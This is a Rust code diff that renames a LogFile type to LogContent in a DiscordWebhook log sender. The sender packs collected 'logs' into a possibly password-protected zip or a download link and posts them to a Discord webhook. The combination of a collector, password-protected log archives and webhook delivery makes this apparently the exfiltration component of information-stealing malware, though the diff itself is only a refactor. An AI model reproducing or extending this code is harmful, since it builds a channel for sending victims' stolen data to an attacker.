@@ -1,4 +1,4 @@
-use crate::{LogFile, LogSender, SendError};
+use crate::{LogContent, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::{format, vec};
@@ -14,19 +14,19 @@ pub struct DiscordWebhook {
     webhook: Arc<str>
 }
 
-fn generate_embed<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> String
+fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
 where
     P: AsRef<str>,
     C: Collector
 {
     let link = match log {
-        LogFile::ExternalLink((link, size)) => Some(
+        LogContent::ExternalLink((link, size)) => Some(
             format!(
                 r#"[Download [{size}]]({link})"#,
                 size = format_size(*size as _)
             )
         ),
-        LogFile::ZipArchive(_) => None
+        LogContent::ZipArchive(_) => None
     };
 
     let password = password.map(|password| {
@@ -118,12 +118,12 @@ impl DiscordWebhook {
 }
 
 impl LogSender for DiscordWebhook {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(&self, log_file: LogContent, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
         C: Collector
     {
-        if let LogFile::ZipArchive(archive) = &log_file
+        if let LogContent::ZipArchive(archive) = &log_file
             && archive.len() >= 8 * 1024 * 1024 // 8 MB
         {
             return Err(SendError::LogFileTooBig)
@@ -147,7 +147,7 @@ impl LogSender for DiscordWebhook {
         };
 
         let mut builder = MultipartBuilder::new("----Multipart");
-        if let LogFile::ZipArchive(archive) = log_file {
+        if let LogContent::ZipArchive(archive) = log_file {
             write_file_field!(builder, "file", "log.zip", "application/zip", &archive);
         }
 
